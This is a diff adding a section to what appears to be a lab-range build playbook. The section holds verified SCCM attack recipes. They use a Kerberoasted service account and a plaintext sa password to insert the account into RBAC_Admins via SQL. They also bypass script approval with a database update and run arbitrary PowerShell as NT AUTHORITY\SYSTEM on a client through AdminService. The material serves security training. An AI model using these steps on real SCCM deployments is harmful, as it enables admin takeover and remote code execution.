@@ -284,6 +284,73 @@ Invoke-WebRequest -Uri "https://mbr02.range.local/AdminService/wmi/" -UseBasicPa
 
 ---
 
+## Phase 6B — WT037 CMPivot + WT039 Script-as-SYSTEM: VERIFIED WORKING RECIPES (2026-08-02)
+
+> **FINAL VERIFIED STATE:** WT037 (CMPivot) and WT039 (arbitrary script as `NT AUTHORITY\SYSTEM`) both **work live from ws01** as the compromised `RANGE\svc_sccm` (Kerberoast identity from WT033). This closes the two-day blocker. Three stacked root causes had to be fixed in order — each was real and each masked the next:
+
+### Fix 1 — BGB fast channel dead (the silent dispatcher killer)
+**Symptom:** ClientOperations (CMPivot/scripts) created with `ReturnValue=0` but never dispatched; `ClientOperation` stuck at `State=1`; client logs showed `Failed to signin bgb client` + `/bgb/handler.ashx?RequestType=LogIn` → **HTTP 500** (`0x87d0027e` — the same code as the original client-install failure).
+**Root cause:** `C:\Program Files\SMS_CCM\SMS_BGB` (the IIS `/bgb` vdir for the client-notification fast channel) was **EMPTY** — client cleanup deleted it, and `Remove/Add-CMManagementPoint` (mp.msi) does **NOT** restore it (it is installed by a separate MSI). Also TCP **10123** (fast-channel) was not listening.
+**Fix (config channel, mbr02 as `MBR02\vagrant`):**
+```powershell
+# bgbisapi.msi is still in the extracted source on mbr02
+msiexec /i "C:\Program Files\Microsoft Configuration Manager\cd.latest\SMSSETUP\BIN\X64\bgbisapi.msi" SITECODE=CAD SMSDIR="C:\Program Files\Microsoft Configuration Manager" /qn
+Restart-Service SMS_EXECUTIVE -Force
+netstat -ano | findstr 10123   # expect LISTENING
+```
+**Verify:** WS01 `C:\Windows\CCM\Logs\CcmNotificationAgent.log` → `Receive signin confirmation message from server, client is signed in` + `192.168.77.23:10123 ... ESTABLISHED`.
+
+### Fix 2 — `svc_sccm` was never actually an SCCM admin (docs/playbook wrong)
+**Symptom:** `Device(16777220)` via AdminService as `svc_sccm` → **403**; `Device/AdminService.GetGrantedClassPermissions` → `0`; `Device?$top=3` → empty. (The `SMS Admins` local-group membership grants provider **namespace** access, NOT RBAC. Phase 7.5's `SMS_Admin` WMI creation did not persist — only `MBR02\vagrant` was in `RBAC_Admins`, created 2026-08-01 during the MP fix.)
+**Root cause:** `RBAC_Admins` contained only `MBR02\vagrant` (AdminID 16777217).
+**Fix — the documented Takeover-1 DB primitive (mirror the working Full Admin), via `sa` on `CM_CAD` (we hold `s@_P@ssw0rd!L@b!`):**
+```sql
+-- svc_sccm SID (from ADSI/LDAP): 0x010500000000000515000000CE54EC0C9A699DBB4A69553B5C040000
+INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite)
+VALUES (0x010500000000000515000000CE54EC0C9A699DBB4A69553B5C040000,'RANGE\svc_sccm',0,0,'svc_sccm',GETDATE(),'svc_sccm',GETDATE(),'CAD');
+-- then mirror RBAC_ExtendedPermissions from the working admin (16777217):
+INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID)
+VALUES (16777218,'SMS0001R','SMS00001','1'),(16777218,'SMS0001R','SMS00004','1'),(16777218,'SMS0001R','SMS00ALL','29');
+-- restart SMS_EXECUTIVE to refresh the provider RBAC cache
+```
+**Verify:** `Device(16777220)` via AdminService as `svc_sccm` → **200** + JSON.
+
+### Fix 3 — Script approval (author cannot self-approve)
+**Symptom:** `POST /AdminService/wmi/SMS_Scripts/<guid>/AdminService.UpdateApprovalState` → **500** ("hierarchy settings do not allow author's to approve their own scripts" — the SCCMHunter-documented wall); `RunScript` → **403** until approved.
+**Fix (we hold `sa`):**
+```sql
+UPDATE Scripts SET ApprovalState=3 WHERE ScriptGuid='<guid>';   -- table is Scripts, NOT SMS_Scripts
+```
+
+### WT037 recipe — CMPivot (verified, returns live client data)
+```powershell
+# ws01, as range\svc_sccm (NTLM explicit creds + TrustAllCertsPolicy)
+$body = '{"InputQuery":"LogicalDisk"}'
+POST https://mbr02.range.local/AdminService/v1.0/Device(16777220)/AdminService.RunCMPivot   # → OperationId
+GET  https://mbr02.range.local/AdminService/v1.0/Device(16777220)/AdminService.CMPivotResult(OperationId=N)  # 404 → then 200
+# Result: {"value":{"Status":"1","Result":[{"DeviceID":"C:","FileSystem":"NTFS","FreeSpace":"153601","Size":"203674","SystemName":"WS01",...}]}}
+```
+
+### WT039 recipe — script as SYSTEM (verified, `ScriptOutput: "nt authority\system"`)
+```powershell
+# 1) Create (script = base64 of UTF-16LE+BOM of the ps1; ScriptType 0)
+POST https://mbr02.range.local/AdminService/wmi/SMS_Scripts.CreateScripts/
+  {"ApprovalState":3,"ParamsDefinition":"","ScriptName":"WT039-SYSTEM-Proof","Author":"RANGE\svc_sccm",
+   "Script":"<base64>","ScriptVersion":"1","ScriptType":0,"ParameterlistXML":"","ScriptGuid":"<new-guid>"}   # → {"ReturnValue":0}
+# 2) Approve — via DB (Fix 3), because UpdateApprovalState → 500 for the author
+# 3) Run
+POST https://mbr02.range.local/AdminService/v1.0/Device(16777220)/AdminService.RunScript
+  {"ScriptGuid":"<guid>"}   # → value = OperationId
+# 4) Poll
+GET https://mbr02.range.local/AdminService/v1.0/Device(16777220)/AdminService.ScriptResult(OperationId=N)
+# → {"value":{"Status":"1","Result":[{"ScriptOutput":"nt authority\\system"}]}}
+```
+**On-client evidence:** `C:\Windows\Temp\wt039-system.txt` = `nt authority\system`; `wt039-marker.txt` = `WT039-PROOF-SYSTEM-EXEC`.
+
+> **Tooling note (do NOT reinvent):** the reference implementation of this exact flow is **SCCMHunter** (`garrettfoster13/sccmhunter` → `sccmhunter.py admin -u ...` → `get_device` → `interact <resourceid>` → `script /path.ps1`), see mayfly277 *SCCM-LAB part0x2/0x3*. Script creation goes through the **AdminService wmi passthrough** (`/AdminService/wmi/SMS_Scripts.CreateScripts/`), NOT raw WMI (raw WMI `CreateScripts` fails with `Property (Feature) Missing! / Invalid input argument (ScriptGuid)`).
+
+---
+
 ## Phase 7 — Apply SCCM Misconfigurations (Attack Surface) — SCCM Console GUI
 
 After SCCM is installed and running. **Do NOT use WMI** — the WMI approach fails on Server 2025. Use the SCCM Console GUI for all three:
